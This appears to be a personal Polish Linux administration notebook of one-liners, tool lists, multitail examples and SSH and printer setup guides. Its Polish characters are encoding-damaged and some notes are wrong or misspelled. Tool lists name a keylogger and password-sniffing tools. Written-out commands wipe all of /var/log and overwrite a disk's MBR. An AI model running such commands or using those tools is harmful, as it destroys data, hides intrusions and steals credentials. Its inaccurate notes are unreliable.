-----------
dig @8.8.8.8 domena.pl
dig domena.pl MX
-------------------------
8 Kb = 1 KB
4 Mb/s = 512 KB/s wyszło to z takiego działania: 4096 Kb (4Mb) / 8b (1B)
3 Mb/s = 384 KB/s wyszło to z takiego działania: 3072 Kb (3Mb) / 8b (1B)
2 Mb/s = 256 KB/s wyszło to z takiego działania: 2048 Kb (2Mb) / 8b (1B)
1 Mb/s = 128 KB/s wyszło to z takiego działania: 1024 Kb (1Mb) / 8b (1B)
512 Kb/s = 64 KB/s wyszło to z takiego działania: 512 Kb / 8b (1B)
256 Kb/s = 32 KB/s wyszło to z takiego działania: 256 Kb / 8b (1B)
128 Kb/s = 16 KB/s wyszło to z takiego działania: 128 Kb / 8b (1B)
64 Kb/s = 8 KB/s wyszło to z takiego działania: 64 Kb / 8b (1B)
32 Kb/s = 4 KB/s wyszło to z takiego działania: 32 Kb / 8b (1B)
------------------------

Chcę porównać pliki lokalne ze zdalnymi, mam do dyspozycji  bash'a z
wykorzystaniem ssh do połączenia zdalnego. Chcę uzyskać listę plików które
mają różnicę w wielkości i dacie zmian. Rsync próbowałem zmusić do
stworzenia listy plików które będzie 'aktualizował' ale z opcją
--list-only zwraca mi wszystkie pliki. może coś robię źle?

Do końca nie wiem jak się za to zabrać. ssh user@host "ls -la /test" >
zdalna_lista ls -la /test > lokalna_lista

ssh komp "find /home/test -type f -printf '%p %s %T@\n'" | sort > lista.1
find  /home/test -type f -printf '%p %s %T@\n' | sort > lista.2 diff
lista.1 lista.2 | grep ">" | awk '{ print $2 }'

----------------------
                   

epylog - Log analyzer and parser  
fwlogwatch - Firewall log analyzer, report generator and realtime response agent  
iftop  Display bandwidth usage on an interface  
nagios - Open Source host, service and network monitoring program  
lshw - Hardware lister  
testdisk -  Tools to check and undelete partition or recover deleted files  
uberkey - Keylogger  
denyhosts -  Scan ssh server logs and block hosts  
linscope -  Network scanner for network shares  
nettop
netstat -tup
netstat -tulp

mount //10.1.3.114/C$ /mnt -o username=user,passored=xxxxxxxxxx
mount WarcraftReign.iso /mnt -t iso9660 -o ro,loop=/dev/loop0

partimage

multitail /var/log/apache/access.log -I /var/log/apache/error.log

# Show 3 logfiles in 2 columns:

multitail -s 2 /var/log/apache/access.log /var/log/messages /var/log/mail.log

# Show 5 logfiles while merging 2 and put them in 2 columns with only one in the left column:

multitail -s 2 -sn 1,3  /var/log/apache/access.log -I /var/log/apache/error.log /var/log/messages \
                        /var/log/mail.log /var/log/syslog

# Merge the output of 2 ping commands while removing "64 bytes received from" from only 1 of them:

multitail -l "ping 192.168.0.1" -ke "64 bytes from" -L "ping 192.168.0.2"

# Show the output of a ping-command and if it displays a timeout, send a message to all users
currently logged in

multitail -ex timeout "echo timeout | wall" -l "ping 192.168.0.1"

# In one window show all new TCP connections and their state changes using netstat while in
the other window displaying the merged access and error logfiles of apache

multitail -R 2 -l "netstat -t" /var/log/apache/access.log -I /var/log/apache/error.log

# As the previosu example but also copy the output to the file netstat.log

multitail -a netstat.log -R 2 -l "netstat -t tcp" /var/log/apache/access.log -I /var/log/apache/error.log

# Show 2 logfiles merged in one window but give each logfile a different color so that you
can easily see what lines are for what logfile:

multitail -ci green /var/log/apache/access.log -ci red -I /var/log/apache/error.log

# Show 3 rssfeeds merged in one window using rsstail

multitail -cS rsstail -l "rsstail -n 1 -z -l -d -u http://setiathome.berkeley.edu/rss_main.php" \
	-cS rsstail -L "rsstail -n 1 -z -l -d -u http://www.biglumber.com/index.rss" -cS rsstail \
	-L "rsstail -n 1 -z -l -u http://kernel.org/kdist/rss.xml"

# Show a Squid (proxy server) logfile while converting timestamps to something readable

multitail -cv squid /var/log/squid/access.log

# Display Q-Mail logging while converting the timestamp into human readable format

multitail -cv qmailtimestr /var/log/qmail/qmail.smtpd.log

# Merge ALL apache logfiles (*access_log/*error_log) into one window:

multitail -cS apache --mergeall /var/log/apache/*access_log --no-mergeall -cS apache_error \
	--mergeall /var/log/apache/*error_log --no-mergeall


### top 5 most recently attacked accounts
lastb | awk '{print $1}' | sort | uniq -c | sort -rn | head -5

### top 5 most attacked accounts
awk 'gsub(".*sshd.*Failed password for (invalid user )?", "") {print $1}' /var/log/secure* | sort | uniq -c | sort -rn | head -5

### top 5 attacker IP addresses (obscured for privacy)
awk 'gsub(".*sshd.*Failed password for (invalid user )?", "") {print $3}' /var/log/secure* | sort | uniq -c | sort -rn | head -5

ntop
wine

dovecot - pop linux serwer

MBR copy
dd if=/dev/sda bs=1 count=512 of=./mbr_copy

z pliku na dysk
dd if=./mbr_copy bs=1 count=512 of=/dev/sda


bzip2 -d plik.tar.bz2
tar xvf plik.tar

tar xvjf plik.tar.bz2

List out your last update with rpm

rpm -qa --last | tac
rpm -q glibc glibc-common binutils compat-libstdc++-296 gcc gcc-c++ libstdc++ libstdc++-devel openmotif21 \
pdksh setarch make gnome-libs sysstat compat-db control-center xscreensaver

sprawdzenei czy pakiety sa zainstalowane
nmap -sT -O localhost
lsof -i | grep 834
lsof +D /mnt/cdrom
multitail

vncviewer -fullscreen 192.168.0.1:0

ssh 

How to copy files/folders from remote Fedora machine into local machine (scp)
scp -r username@192.168.0.1:/home/username/remotefile.txt .

How to copy files/folders from local machine into remote Fedora machine (scp)
scp -r localfile.txt username@192.168.0.1:/home/username/

How to copy files/folders from remote Fedora machine into local machine (rsync)
rsync -v -u -a --delete --rsh=ssh --stats username@192.168.0.1:/home/username/remotefile.txt .

How to copy files/folders from local machine into remote Fedora machine (rsync)
rsync -v -u -a --delete --rsh=ssh --stats localfile.txt username@192.168.0.1:/home/username/

grep MemTotal /proc/meminfo

grep "model name" /proc/cpuinfo

oracle

rpm -q binutils compat-db control-center gcc gcc-c++ glibc glibc-common gnome-libs \
         libstdc++ libstdc++-devel make pdksh sysstat xscreensaver libaio

rpm -q redhat-release - jaki jest system
cat /etc/redhat-release
cat /etc/issueau
kontact
fail2ban - weryfikacja nieudanych prob logowania
chkrootkit - program skanujący uslugi w poszukiwaniu rootkitow
rkhunter - program skanujący uslugi w poszukiwaniu rootkitow
enemy-territory - gra 3d 
iftraf ???

---------- kopiowanie okreslonych plików
find /mnt/plytkaDebiana -name \*deb -exec cp '{}' /mnt/pakiety/DVD \;

procesy które mają otwart pliki w danym katalogu
find /home/user/ -type d  -exec fuser {} \;

azureus
mldonkey
toolame

sadf

dmesg | grep -i ntfs
grep -i ntfs /var/log/messages

history 10
history !15

odzyskiwanie danych 
pc inspector recovery

niszczenie plików
shred

linux
testdisk
magic rescue

sleudkid
de sloudkid 

teel task
 autopsy

de sloudkid 
tel task

teel task

gpard

kaskowanie danych
shed
wite

------------------
1) Check the current DNS server
host www.linuxhomenetworking.com
host 65.115.71.34
nslookup www.linuxhomenetworking.com
nslookup 65.115.71.34

{lista po³¹czeñ} 
grep -v udp /proc/net/ip_conntrack|cut -c 12-|cut -d" " -f 2,3,4,5,6|sort -k 2,5

( linux screen )
Przydatna konsola szczególnie przy upgradzie systemu lub innych czynnociach gdzie nie chcielibymy aby zerwa³o bie¿¹c¹ sesjê ssh, bez wdawania siê w szczegó³y

1) install screen
2) odpalamy poleceniem screen 
3) znajdujemy siê w wirtulanej konsoli gdzie u¿ywamy klawiszy:

"ctrl" + "a" nastêpnie "c"	#tworzy nowe okno
"ctrl" + "a" nastêpnie "n"	#prze³¹cza do nastêpnego okna
"ctrl" + "a" nastêpnie "p"	#prze³¹cza do poprzedniego okna
"ctrl" + "a" nastêpnie "i"	#informacja o oknie

4) je¿eli zerwa³o sesjê wejd ponownie i wpisz:
screen -x

5) zrywaj sesjê poleceniem:
"ctrl" + "a" nastêpnie "d"

6) powracaj do niej:
screen [-d] -r [pid.]tty.host

{lista komend}
tail -f [plik]					#pokazuje na bie¿¹co zawartoæ pliku od jego koñca
ctrl + C, fg [nr jobs], jobs	#obs³uga procesów bed¹cych w tle
iptables -L -t nat -v|drop		#lista wszystkich regu³ z ³añcucha nat za wyj¹tkiem drop
iptables -m [cel] --help		#opis celu
sort -u										#sortuje i wypisuje tylko niepowtarzaj¹ce siê rekordy
ctrl z										#pauza do programu
bg [program]								#wrzucenie programu do background
jobs										#wywietlenie numerów zadañ w tle
fg [nr z jobs]								#przywrócenie zadania z powrotem
find / -perm +4000							#szukanie setuid
find -perm -002 -mtime,-atime,-ctime -n,+n	#pliki z co najmniej prawem zapisu i -mtime modyfikowane,-atime do ktorych sie dostano,-ctime 
#którym zmieniono uprawnienia,-n w ciagu n dni,+n dawniej niz n dni temu
find / -name plik -exec /bin/polecenie {} \;
#wykonanie na znalezionym pliku /bin/polecenie
lspci				#listuje urz¹dzenia dla pci podobnie lsusb
date[opcje], hwclock --systohc	#konfiguracja daty
strobe				#skanowanie
scripts				#wyci¹ganie tekstu z binarek
file [plik]			#pokazanie rodzaju pliku
md5sum -b [plik]		#suma md5 z pliku
lsmod				#lista modu³ów
strings [plik]			#wypisanie np. z pliku w C ciagów znaków
uniq -d				#wypisuje tylko linie powtarzajace sie
strace [polecenie] 2> [plik]	#zapis w pliku inf o wykonywanych przez polecenie instrukcji
strace -f -e open [polecenie]	#jw tyko -f procesy potomne, -e open otwierane pliki
echo "$((`date -d '10 mar' +%s`-`date +%s`))/86400"|bc
#obliczanie dni pomiêdzy okrelonymi datami
zcat /usr/src/2.4.32-libata1.patch.gz | patch -p1 
#patchowanie j¹dra - bed¹c w katalogu ze ródlami
logger [tekst]			#wpis do logów dowolnego tekstu
sed -e's/a//g'			#edytor liniowy
shc -f				#kompilacja plików w bashu
expect				#automatyczne wykonywanie programów
which [polecenie]		#do jakiej cie¿ki odnosi sie polecenie
locate [plik]			#proste wyszukiwanie pliku
man -k [slowo],apropos [slowo]	#wyszukiwanie manuali w których wystêpuje [slowo]
/proc/sys/kernel/printk		#ustawienia dotyczace komunikatow
mbmon				#odczyty z czujnikow na plycie glownej
ab				#testowanie serwera Apache
mii-tools			#testowanie linkow
tcpdump -D			#wypisuje wszystkie interfejsy
tcpdump 'tcp[tcpflags] & {tcp-syn) !=0'	
#nas³uch pakietow SYN
tcpdump -nv dst  and 'icmp[icmptype] = icmp=echo'
#nas³uch tylko icmp-echo
hdparm -it /dev/hda		#testowanie prêdkoci dysku
iperf -s,iperf -c [IP servera]	#testowanie prêdkoci ³¹cza komendy odpowiednio dla serwera i dla klienta
ethtool				#zestawienie kart sieciowych
type [program]			#pokazuje cie¿kê do programu
cfdisk /dev/hda1		#do kasowania i tworzenia partycji
mkfs  -t xfs -f /dev/hda1	#do formatowania partycji
man [polecenie]| col -b >[plik]	#zamiana mana na plik tekstowy
ldd [polecenie]			#pokazuje z jakich bibliotek korzysta polecenie
dpkg --get-selections "*"	#wywietla listê zainstalowanych pakietów
watch				#powtarzanie polecen z wyswietlaniem wyniku na konsole


( linux aplikacje )

nmap				#skaner
tcpump				#do nasluchiwania
hping3, sendip			#wysylanie dowolnych pakietow
iptraf,nload,iftop,ipfm		#wykorzystanie lacza
netcat				#zamiast telneta
p3scan				#transparent pop3-proxy
hdparm				#testowanie hdd
ettercap,dsniff			#do wyciagania hasel
mondo,mindi			#programy do backupu i do bootu
modconf				#manager modulow
mbmon				#odczyty z czujnikow na plycie glownej
minicom				#obsluga portu szeregowego
ntop				#monitorowanie sieci

dmesg|grep hd

{skrypty}
Np.: Mamy pliczek: test testowanego testu.txt a chcemy mieæ test_testowanego_testu.txt

ls | while read plik ; do mv "$plik" `echo $plik|tr ' ' '_'` ; done

wyswietlanie zawartosci pliku bez # i pustych lini
» 2006-11-28 21:16:25 » dodal: BiExi »
» czytan: 1791 » dzial: Skrypty »

NP.:Jak wywietliæ zawartoæ pliku bez spacji i pustych lini.....

cat nazwa_pliku |grep -E -v "^#|^$"

NP.:Uruchamianie programu jesli nie jest uruchomiony

if [ -z `pgrep -n mpd` ]
then
mpd
fi

Najlepiej dodac? do .bashrc

NP.: Jak zmieniæ hurtem du¿¹ iloæ nazw plików
Mamy np. pliki cos.txt plik.avi 12qasw.doc itd. a chcemy mieæ 01.txt 02.avi 03.doc itd.
a=1;for x in *;do echo mv "$x" `printf %02d $a`.`echo $x|cut -f 2 -d "."`;a=$[a+1];done

NP.:Wyszukiwanie danego s³owa w du¿ej iloci plików

W jaki sposób szybko znaleæ w którym z plików z danego katalogu znajduje siê szukany wyraz?

Tworzymy skrypt o treci
#!/bin/bash
pliki=`ls`
szukany=$1
i=''
if [ $1 == '-i' ] && [ ! -z $2 ]; then
szukany=$2
i='-i'
fi

for plik in $pliki
do
if [ `grep $i $szukany $plik | wc -l` -gt 0 ]; then
echo S³owo '"'$szukany'"' znajduje siê w pliku: $plik
fi
done

o nazwie np. gdziejest. Najlepiej umieszczamy go w /usr/local/bin lub, jeli nie mamy dostêpu do konta root, tworzymy alias umo¿liwiaj¹cy ³atwe uruchomienie skryptu.

U¿ycie:
Skrypt uruchamiamy podaj¹c jako argument szukany przez nas wyraz, np.:

$ gdziejest przyk³ad

W efekcie wywietlona zostanie lista plików z danego katalogu, które zawieraj¹ szukany wyraz.
Je¿eli chcesz, ¿eby skrypt podczas wyszukiwania by³ niewra¿liwy na wielkoæ liter dodaj flagê -i, np.:

$ gdziejest -i PrZyK³Ad

NP.:Usuwanie komentarzy z pliku
Prosty sposób, aby pozbyæ siê z pliku wszystkich zakomentowanych linijek
grep -v ^# plik > plik_bez_komentarzy


NP.:Autologowanie i autostart X

Automatyczne logowanie do systemu na pierwszej konsoli oraz uruchomienie rodowiska X. Przydatne gdy nie chcemy posiadaæ *DM a brakuje nam tej opcji.

Zaczynamy od skompilowania poni¿szego programu:
int main() {
execlp( "login", "login", "-f", "u¿ytkownik", 0);
}

U¿ytkownik zastêpujemy nazw¹ konta które ma zostaæ automatycznie logowane. Plik nale¿y zapisaæ z rozszerzeniem autologowanie.c .
Nastêpnie kompilujemy:
gcc autologowanie.c -o autologowanie

Podczas kompilacji mog¹ wyskoczyæ ostrze¿enia dotycz¹ce deklaracji funkcji execlp. Nie ma siê czym przejmowaæ, plik wynikowy powinien zostaæ utworzony. Przenosimy go do /usr/local/sbin/:
mv autologowanie /usr/local/sbin

Nastêpn¹ czynnoci¹ jest zmodyfikowanie /etc/inittab:
Poni¿szy wpis:
1:2345:respawn:/sbin/getty 38400 tty1

Komentujemy lub zastêpujemy poni¿szym:
1:2345:respawn:/sbin/getty -n -l /usr/local/sbin/autologowanie 38400 tty1

Przedostatni¹ czynnoci¹ jest zmodyfikowanie ~/.bash_profile dla pow³oki bash lub analogiczny, jeli u¿ywamy innej:
if [ -z "$DISPLAY" ] && [ $(tty) == /dev/tty1 ]; then
startx
fi

Na koniec dodajemy wpis do .xinitrc, który uruchomi menad¿er okien czy rodowisko graficzne:
#exec startfluxbox
#exec gnome
#exec startkde
#exec startxfce4

NP.:Zamazywanie danych, skuteczne usuwanie plików, partycji, dysków programem wipe w debianie

Bezpiecznie usuwanie plików, partycji, dysków poprzez wielokrotne zamazanie mieciami programem wipe.


Wipe wielokrotnie nadpisuje plik do zniszczenia specjalnymi wzorcami, u¿ywaj¹c wywo³ania fsync() lub/i bitu O_SYNC by wymusiæ dostêp do dysku. W normalnym trybie u¿ywane s¹ 34 wzorce (z tego osiem losowych). Tryb szybki u¿ywa tylko czterech przejæ w losowymi wzorcami, co jest oczywicie mniej bezpieczne.

Instalujemy wipe:



wipe -rcf /home/berke/plaintext/
- zama¿e ca³y katalog ze wszystkimi podkatalogami (opcja -r), 34 przejciami, bez pytania o potwierdzenie (opcja -f), je¿li jakie pliki w rodku bêd¹ bez praw do zapisu to automatycznie zmieni uprawnienia na zezwalaj¹ce na zapis (opcja -c)

wipe -kq /dev/hda3
- zama¿e urz¹dzenie blokowe (partycjê) /dev/hda3 w trybie szybkim (-q) - 4 przejcia, bez odlinkowania inode pliku (czyli plik urz¹dzenia nie zostanie usuniêty, bo tego nie chcemy - opcja -k), ¿¹danie potwierdzenia "yes" przed rozpoczêciem

wipe -kqD /dev/floppy
- wipe domylnie nie pod¹¿a za linkami symbolicznymi, dopóki nie zostanie to wymuszone (-D), zamazywanie /dev/floppy, który jest np. linkiem do /dev/fd0u1440, ¿¹danie potwierdzenia "yes" przed rozpoczêciem

wipe -rfi >wipe.log /var/log/*
- rekursywnie (-r) zniszczy wszystko w katalogu /var/log, za wyj¹tkiem /var/log, bez opcji zmiany uprawnieñ w przypadku trafienia na pliki tylko do odczytu, szczegó³owe informacje podczas procesu zamazywania (-i), rozpoczêcie bez pytania o potwierdzenie (-f)

Inne opcje:

-Q <liczba przebiegów> - iloæ przbiegów wipe na pliku
-a - przerwanie w razie b³êdu

NP.:SSH - Automatyczne pod³¹czanie sie do sesji screena przy logowaniu

Jak jednym poleceniem zalogowaæ siê przez ssh, prze³¹czyæ siê na u¿ytkownika root i pod³¹czyæ siê do sesji screen'a.

1. Logowanie siê na konsolê screena.
Aby pod³¹czyæ siê do sesji screena loguj¹c siê przez ssh wystarczy wykonaæ polecenie:
ssh -t user@host "su -c 'screen -d -RR'"

Polecenie loguje nas przez ssh, wykonuje na zdalnej polecenie odpalenia sesji screena na prawach superu¿ytkownika.
Parametry screena:

-d -RR - Pod³¹cz na nowo sesjê, a jeli to konieczne, od³¹cz j¹ lub utwórz. U¿yj pierwszej sesji jeli dostêpnych jest wiêcej ni¿ jedna.


2. Odpalanie programu konsolowego na zdalnej maszynie.
Wykonujemy po prostu polecenie:
ssh -t user@host "mtr www.google.pl"


W obu przypadkach czy po od³¹czeniu sesji screen'a czy po zakoñczeniu mtr, zakoñczy siê róznie¿ sesja ssh. Paramter polecenia ssh "-t" niejako przypina program do naszego lokalnego terminala, tak mi siê wydaje :)


NP.:czy mam w systemie rotkity

Jak sprawdzi? czy nie ma w systemie rootkitów?

jest do tego kilka narz?dzi oto namiary:

rkdet - http://vancouver-webpages.com/rkdet/
rscan - http://www.hsc.fr&ressources/outils/rkscan
saint jude - http://sourceforge.net/projects/stjude/
rootkithunter - http://www.rootkit.nl/projects/rootkit_hunter.html
chkrootkit - http://www.chkrootkit.org/

NP.:sciaganie calych stron wget
I rozpoczynamy sciagnie wybranej stronki
wget -r -k <zrodlowy_url>

-r zgrywaj rekurencyjnie (caly katalog wraz z jego zawartoscia)
-k utworz kopie zdolna do otwarcia offline (bez ponownego laczenia sie z internetem)

Pamietajmy ze nie wszystkie strony da sie w taki sposob sciagnac gdzy moga byc zabezpieczone przed takim procederem.


NP.:Nazwy kompow w otoczeniu secioym
nbtscan 10.10.10.2-100

NP.:Drukowanie przez udostêpnion¹ drukarkê na Windows

Opis jak skonfigurowac nasz system do korzystania z udostepnionej drukarki na Windows

1. Instalacja potrzebnego oprogramowania.
Potrzebujemy doinstalowaæ cupsys i smbclient do naszego systemu, jeli jeszcze ich nie mamy.

install cupsys smbclient

2. Zbieranie informacji
Wyci¹gniemy trochê informacji o udostêpnionej drukarce
$ smbclient -L caparz0 -N

Zamiast caparz0 podajemy nazwê NetBIOS komputera, który udostêpnia drukarkê. Je¿eli mamy problem z odczytaniem informacji tylko po samym NetBIOS, mo¿emy po³¹czyæ siê dodaj¹c IP komputera, s³u¿y do tego prze³¹cznik -I:
$ smbclient -I 192.168.1.2 -L caparz0 -N

Oto co nam mo¿e zwróciæ.
Domain=[CAPARZ0] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
.
Sharename Type Comment
--------- ---- -------
Filmy Disk
IPC$ IPC Zdalne wywo³anie IPC
D$ Disk Domylny udzia³
print$ Disk Sterowniki drukarek
muzyka Disk
HPLaserJ Printer HP LaserJet 1100 (MS)
for all Disk
ADMIN$ Disk Administracja zdalna
C$ Disk Domylny udzia³
Domain=[CAPARZ0] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
.
Server Comment
--------- -------
.
Workgroup Master
--------- -------

3. Konfiguracja
Kiedy ju¿ mamy informacje o drukarce potrzebny nam bêdzie PostScrip Printer Description, w skrócie PPD, do ci¹gniêcia, np. z tej strony. Maj¹c ju¿ wszystkie potrzebne dane, pora zadeklarowaæ drukarkê w naszym systemie.
# lpadmin -p caparz0Printer -v smb://caparz0/HPLaserJ -P /root/HPLaserJ.ppd -D "HP LaserJet 1100" -d caparz0Printer -E

Male objanienie prze³¹czników, które u¿y³em powy¿ej:
* -v - cie¿ka do urz¹dzenia
smb:// oznacza protokó³ z jakiego skorzystamy, caparz0 nazwê NetBIOS komputera (mo¿emy u¿yæ IP) natomiast HPLaserJ, to nazwa udzia³u, który dowiedzia³em siê korzystaj¹c z smbclient. Jak? Napisa³em wy¿ej :P

* -P - cie¿ka do naszego, wczeniej ci¹gniêtego, pliku PPD

* -D - opis naszej drukarki, np. Sekretariat, Drukarka Pani Jadzi

* -d - ustawia drukarkê caparz0Printer jako domylna, nie potrzebne jak mamy tylko jedna

* -E - uruchamiamy i akceptujemy przyjmowanie zadañ, adekwatne do systemowych poleceñ: enable caparz0Printer i accept caparz0Printer

4. Koniec
Gotowe. Teraz mo¿emy przetestowaæ nasza drukarkê, drukuj¹c jakiego PDF'a.
$ lp ~/ebooki/LordOfTheRings-Trilogy.pdf

No to trochê sobie poczekamy :D

Jak przysta³o na najbardziej zaawansowany OS na wiecie s¹ prostsze sposoby na konfiguracje jak graficzne kreatory ale nie ka¿dy ma iksy ;) Mysle, ¿e ka¿dy siê w nich po³apie maj¹c powy¿sze informacje, jak nie to odsylam na moja strone po full opis ;)


-----
Pakiet SSH pozwala zarówno na zdalne logowanie bez potrzeby podawania has³a oraz zdalne wykonywanie poleceñ z uprawnieniami odpowiedniego u¿ytkownika. Nie jest to skomplikowane zadanie. Jak zrealizowaæ logowanie bez podawania has³a? Przedstawiamy kolejne kroki:

1. Generujemy klucz publiczny / prywatny wykonuj¹c polecenie ssh-keygen.

Linux#ssh-keygen -t rsa

Generating public/private rsa key pair.

Enter file in which to save the key (/root/.ssh/id_rsa):

Enter passphrase (empty for no passphrase):

Enter same passphrase again:

Your identification has been saved in /root/.ssh/id_rsa.

Your public key has been saved in /root/.ssh/id_rsa.pub.

The key fingerprint is:

67:00:86:00:64:00:53:00:d7:00:40:00:b9:00:85:00 root@linux

Polecenie ssh-keygen wygenerowa³o dwa pliki. Pierwszy o nazwie "id_rsa" zawiera klucz prywatny, który nie mo¿e byæ nikomu udostêpniany. Drugi o nazwie "id_rsa.pub" zawiera klucz publiczny, który wysy³amy na dowolny serwer z którym zamierzamy ustanowiæ po³¹czenie.

2. Na tym etapie wykorzystamy mo¿liwoæ przesy³ania plików na zdalne serwery przy wykorzystaniu polecenia SCP. Ten krok nadal wymaga podania has³a.

Linux#scp /root/.ssh/id_rsa.pub root@zdalny_host:~/id_rsa.pub

Warning: Permanently added 'zdalny_host' (RSA) to the list of known hosts.

root@zdalny_host's password:

id_rsa.pub 100% 391 0.4KB/s 00:00

Na zdalny serwer do katalogu domowego u¿ytkownika root zosta³ skopiowany plik id_rsa.pub zawieraj¹cy wygenerowany klucz publiczny.

3. Logujemy siê na zdalny serwer przez wykonanie polecenia:

Linux#ssh root@zdalny_host

Podajemy has³o i zak³adamy na zdalnym serwerze katalog:

zdalny_host#mkdir /root/.ssh

Prawa dostêpu do tego katalogu powinny zostaæ ustawione na 700.

Nastêpnie dodajemy wygenerowany klucz do autoryzowanych na danym serwerze:

zdalny_host:~# cat ~/id_rsa.pub >> ~/.ssh/authorized_keys


Od tej pory mamy mo¿liwoæ logowania siê bez has³a do zdalnego serwera.

Za pomoc¹ SSH mo¿na przeprowadziæ kilka innych interesuj¹cych operacji. Podstawow¹ operacj¹ jest zdalny i szyfrowany dostêp do serwerów. SSH jest tak¿e czêsto wykorzystywane do przesy³ania plików na zdalny serwer:

Linux#scp lokalny_plik zdalny_serwer:/katalog/

Przedstawione polecenie kopiuje lokalny plik do okrelonego katalogu na zdalnym serwerze.

Istnieje tak¿e mo¿liwoæ transmisji w drug¹ stronê:

Linux#scp -r zdalny_serwer:/katalog/plik /lokalny_katalog/


Przedstawione polecenie kopiuje plik na zdalnym serwerze do okrelonego katalogu na lokalnym serwerze.

Niezwykle ciekaw¹ opcj¹ jest mo¿liwoæ zdalnego wykonywania poleceñ:

Linux#ssh nazwa_serwera "polecenie"

Dziêki podobnej sk³adni jestemy w stanie w bezpieczny sposób wykonaæ polecenie na zdalnym serwerze z uprawnieniami dowolnego u¿ytkownika. Przedstawiony proces umo¿liwi wykonywanie poleceñ bez potrzeby podawania has³a.

--------
Chcę porównać pliki lokalne ze zdalnymi, mam do dyspozycji  bash'a z
wykorzystaniem ssh do połączenia zdalnego. Chcę uzyskać listę plików które
mają różnicę w wielkości i dacie zmian. Rsync próbowałem zmusić do
stworzenia listy plików które będzie 'aktualizował' ale z opcją
--list-only zwraca mi wszystkie pliki. może coś robię źle?

Do końca nie wiem jak się za to zabrać. ssh user@host "ls -la /test" >
zdalna_lista ls -la /test > lokalna_lista

ssh komp "find /home/test -type f -printf '%p %s %T@\n'" | sort > lista.1
find  /home/test -type f -printf '%p %s %T@\n' | sort > lista.2 diff
lista.1 lista.2 | grep ">" | awk '{ print $2 }'

------------------------
rm * -i			- usowa wszystkie pliki z danego katalogu  z potwierdzeniem
rm * -f			- usowa wszystkie pliki z danego katalogu i wylacza potwierdzenia 
			  (nawet zabezpieczone przed susnieciem)
rm -f			- usoniecie plikow zabezpieczonych przed kopiowaniem
rm -r			- usoniecie plikow rowiez w podkatalogach
rm -rf			- usowa caly system plikow
ls > wynik				- wyslanie spisu zawartosci katalogu do pliku wynik
			  	  	  jezeli taki plik istnieje to skasuje sie jego poprzednia zawartosc
ls >> wynik				- dopisanie zawartosci katalogu do zawartosci pliku wynik
cat jeden.doc > wszystkie.doc		- nadpisanie zawartosci wpliku wszystkie.doc zawartosciami
					  innych plikow 
cat jeden.doc dwa.doc >> wszystkie.doc	- dopisanie do pliku wszystkie.doc zawartosci innych plikow 
cat nazwa_pliku				- czytanie zawartosci pliku
cat *.doc				- znajdzie np: dwa.doc sratytaty.doc
cat jeden.doc dwa.doc > wszystkie.doc   - wrzuca zawartosc plikow do jednego
cat < jeden.doc > dwa.doc		- wypisze zawartos jeden.doc na ekran (standartowe wyjscie) 
					  i nadpisze zawartosc pliku jeden.doc do pliku dwa.doc
cat parowka.doc | more			- wyjscie programu cat (parowka.doc) jest przekazywane na wyjscie
					  programu more
head -42 nazwa_pliku			- wyswietla 42 pierwszych wierszy zawartych w pliku
tail -42 nazwa_pliku			- wyswietla 42 koncowych wierszy zawartych w pliku (przydaje sie w 
					  obserwowaniu swierzo dopisanych logow do pliku)
cp plik_zrodlowy plik_docelowy		- kopiuje zawartosc z pliku do pliku
cp plik(i)_zrodlowy katalog(i)_docelowy	- kopiuje pliki do katalogu
mv stara_nazwa nowa_nazwa		- zmiana nazwy pliku
mv nazwa_pliku nazwa_katalogu		- przenoszenie pliku do katalogu
lp nazwa_pliku				- drukowanie pliku
lpr nazwa_pliku				- wstawienie pliku do kolejki drukowania
pwd					- pokazuje w jakim jestes katalogu
.					- oznacza katalog biezacy
..					- oznacza katalog nadrzedny
touch nazwa_pliku			- tworzy pusty plik
stty -a					- wypisanie skrotow do np:zatrzymania procesu
mail					- otwiera plik z poczta
printenv albo export (powloka C)	- zobaczenie zawartosci zmiennych srodowiska

nazwa=zawartosc				- pierwszeprzypisze zmiennej powloki odpowiednia zawartosc
export nazwa		  		  drugie utworzy zmienna o tej samej nazwie i zawartosci zo 
					  zmienna powloki

MOJA_ZMIENNA="jakas_wartosc"		- tworzy zmienna srodowiska z wartoscia "jakas_wartosc"
echo $MOJA_ZMIENNA			  wypisuje zawartosc MOJA_ZMIENNA (znakiem dolara poprzedzamy
					  nazwy zmiennych srod. ktore to nazwy powloka ma zastapic 
					  zawartoscia odpowiedniej zmiennej
find sciezka/nazwa_pliku lub kryterium	- wuszukiwanie plikow
grep					- sluzy do wyszukiwania plikow wedlug zadanego wzorca

/////////////////////////////////////// KRYTERIA SZUKANIA OKRESLONYCH STRINGOW  ////////////////////////////////////////////////

*			- zastepuje wiele znakow np: ls *.doc
*.*			- oznacza pliki z kropka w nazwie
*xyz			- oznacza pliki w rodzaju xyz albo fghxyz
?			- zastepuje jeden znak
[abc]			- oznacza a lub b lub c
[a-z]			- oznacza od a do z
doc[0-9]		- oznacza doc0 do doc 9
*[Aa]dd*		- oznacza useradd lub User-Add itd
*[Aa] [Dd] [Dd]*	- oznacza userADD lub xxxAdd itd
- R			- wszystkie podkatalogi

////////////////////////////////////// UZYTKOWNICY PRAWA DOSTEPU ITD /////////////////////////////////////////////////////////

newgrp grupa						- zmiana grupy
chmod g+r jeden.doc					- dodanie uzytkownikom grupy do ktorej nalezy plik jeden.doc 
							  prawa do jego czytania (dolaczanie praw)
      u							- uzytkownik
      o							- pozostali uzytkownicy systemu
      - 						- odebranie danego uprawnienia
chmod u=rw jeden.doc					- nadanie tobie wylacznie czytanie i pisania do pliku jeden.doc (zastepowanie praw)
chmod u=rw /katalog					- masz prawo do przeszukiwania katalogu jezeli nie mialbys tych praw 
							  mozesz znalesc typlko plik ktorego znasz nazwe (zastepowanie praw)	
chmod 777 nazwa_pliku					- nastepny sposob zastepowania praw, numeryczny 777 oznacza akurat przyznanie
							  wszystkich praw wszystkim uzytkownikom do danego pliku a 666 prawo do
							  odczytu i zapisu pliku dla wszystkich uzytkownikow
							
						PRAWA DOSTEPU I ICH ODPOWIEDNIKI NUMERYCZNE:
											---	0
											--x	1
											-w-	2
											-wx	3
											r--	4
											r-x	5
											rw-	6
											rwx	7

umask					- w momencie tworzenia nowego pliku otrzymuje on domyslne prawa
					  dostepu okreslone za pomoca parametru umask
4  2  1					- wartosci liczbowe odpowiadajace okreslonym uprawnieniom
r  w  x 				  kazda liczba odpowiada kolejno uzytkownikowi -> grupie -> "swiatu"
					  (reszcie uzytkownikow)
